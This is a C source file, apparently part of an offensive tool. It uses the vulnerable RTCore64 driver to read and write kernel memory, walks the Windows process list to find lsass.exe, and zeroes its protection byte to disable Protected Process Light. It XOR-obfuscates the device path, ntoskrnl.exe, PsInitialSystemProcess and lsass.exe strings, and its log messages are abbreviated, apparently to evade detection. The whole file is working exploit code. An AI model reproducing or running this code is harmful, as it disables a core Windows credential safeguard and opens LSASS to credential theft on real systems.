#include "memory.h"
#include "driver.h"
#include "logger.h"
#include "offsets.h"
#include "osinfo.h"
#include "utils.h"
#include <string.h>

// =====================================================
// Memory Access Primitives via RTCore64
// =====================================================

#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");
_Static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");
_Static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");
#endif

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ memRead = { 0 };
    memRead.Address = Address;
    memRead.ReadSize = Size;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTC64_MEMORY_READ_CODE,
        &memRead,
        sizeof(memRead),
        &memRead,
        sizeof(memRead),
        &BytesReturned,
        NULL);
    return memRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_WRITE memWrite = { 0 };
    memWrite.Address = Address;
    memWrite.ReadSize = Size;
    memWrite.Value = Value;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTC64_MEMORY_WRITE_CODE,
        &memWrite,
        sizeof(memWrite),
        &memWrite,
        sizeof(memWrite),
        &BytesReturned,
        NULL);
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return (WORD)(ReadMemoryPrimitive(Device, 2, Address) & 0xffff);
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (((DWORD64)ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, (DWORD)(Value & 0xffffffff));
    WriteMemoryPrimitive(Device, 4, Address + 4, (DWORD)(Value >> 32));
}

// Helper function to read a memory buffer in 4-byte chunks
BOOL ReadMemoryBuffer(HANDLE Device, DWORD64 Address, void* Buffer, DWORD BufferSize) {
    DWORD numDwords = BufferSize / 4;
    DWORD remainder = BufferSize % 4;
    for (DWORD i = 0; i < numDwords; i++) {
        ((DWORD*)Buffer)[i] = ReadMemoryDWORD(Device, Address + i * 4);
    }
    if (remainder) {
        DWORD value = ReadMemoryPrimitive(Device, remainder, Address + numDwords * 4);
        memcpy((BYTE*)Buffer + numDwords * 4, &value, remainder);
    }
    return TRUE;
}

// =====================================================
// Function to Read the EPROCESS Structure of lsass.exe
// =====================================================

void disablePPL() {
    Offsets offs = getOffsets();
    if (offs.ActiveProcessLinks == 0 || offs.ImageFileName == 0 || offs.Protection == 0) {
        log_error("Offset not mapped... exiting!");
        exit(1);
    }

    // \\.\RTCore64
    const unsigned char dev_enc[] = { 0x6C, 0x6D, 0x1C, 0x6F, 0x66, 0x61, 0x75, 0x58, 0x4A, 0x5C, 0x57, 0x56 };
    char* dev_path = xor_decrypt_string(dev_enc, sizeof(dev_enc), XOR_KEY, key_len);

    HANDLE Device = CreateFileA(dev_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    free(dev_path);

    if (Device == INVALID_HANDLE_VALUE) {
        log_error("Unable to obtain a handle to the device object");
        return;
    }
    log_info("Device handle obtained");

    DWORD64 ntBase = getKBAddr();
    log_info("Ker base address: 0x%llx", ntBase);

    // LoadLibraryW("ntoskrnl.exe")
    const unsigned char nt_enc[] = { 0x5E, 0x45, 0x5D, 0x40, 0x5F, 0x47, 0x58, 0x5B, 0x16, 0x5C, 0x19, 0x07 };
    char* nt_path = xor_decrypt_string(nt_enc, sizeof(nt_enc), XOR_KEY, key_len);
    wchar_t* nt_pathW = to_wide(nt_path);
    HMODULE hNtoskrnl = LoadLibraryW(nt_pathW);
    free(nt_path); free(nt_pathW);

    if (!hNtoskrnl) {
        log_error("Failed to load Ker");
        CloseHandle(Device);
        return;
    }

    // GetProcAddress("PsInitialSystemProcess")
    const unsigned char ps_enc[] = { 0x60, 0x42, 0x7B, 0x5D, 0x5D, 0x41, 0x5F, 0x56, 0x54, 0x6A, 0x18, 0x11, 0x17, 0x01, 0x08, 0x36, 0x15, 0x07, 0x0A, 0x0F, 0x43, 0x42 };
    char* ps_str = xor_decrypt_string(ps_enc, sizeof(ps_enc), XOR_KEY, key_len);
    DWORD64 ps_offset = (DWORD64)CustomGetProcAddress(hNtoskrnl, ps_str) - (DWORD64)hNtoskrnl;
    // log_info("PsInitialSystemProcess offset: 0x%llx", (unsigned long long)ps_offset);
    
    free(ps_str);
    FreeLibrary(hNtoskrnl);
    
    DWORD64 sys_eproc = ReadMemoryDWORD64(Device, ntBase + ps_offset);
    // log_info("PsInitialSystemProcess (EPROCESS) address: 0x%llx", sys_eproc);
    log_info("System entry address: 0x%llx", sys_eproc);

    DWORD64 list_head = sys_eproc + offs.ActiveProcessLinks;
    DWORD64 curr_entry = ReadMemoryDWORD64(Device, list_head);

    while (curr_entry != list_head) {
        DWORD64 eproc = curr_entry - offs.ActiveProcessLinks;
        char name[16] = { 0 };
        ReadMemoryBuffer(Device, eproc + offs.ImageFileName, name, 15);
        name[15] = '\0';

        // "lsass.exe"
        const unsigned char ls_enc[] = { 0x5C, 0x42, 0x53, 0x40, 0x47, 0x1B, 0x53, 0x4F, 0x5D };
        char* target = xor_decrypt_string(ls_enc, sizeof(ls_enc), XOR_KEY, key_len);

        if (_stricmp(name, target) == 0) {
            free(target);
            log_info("Found EPRO at 0x%llx", eproc);

            BYTE prot = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection);
            log_info("Protection value: 0x%02X", prot);

            // Disable
            WriteMemoryPrimitive(Device, 1, eproc + offs.Protection, 0x00);
            log_success("PPL disabled (0x00 written)");

            BYTE post = (BYTE)ReadMemoryPrimitive(Device, 1, eproc + offs.Protection);
            log_info("Protection value after write: 0x%02X", post);
            break;
        }
        free(target);
        curr_entry = ReadMemoryDWORD64(Device, curr_entry);
    }

    CloseHandle(Device);
}
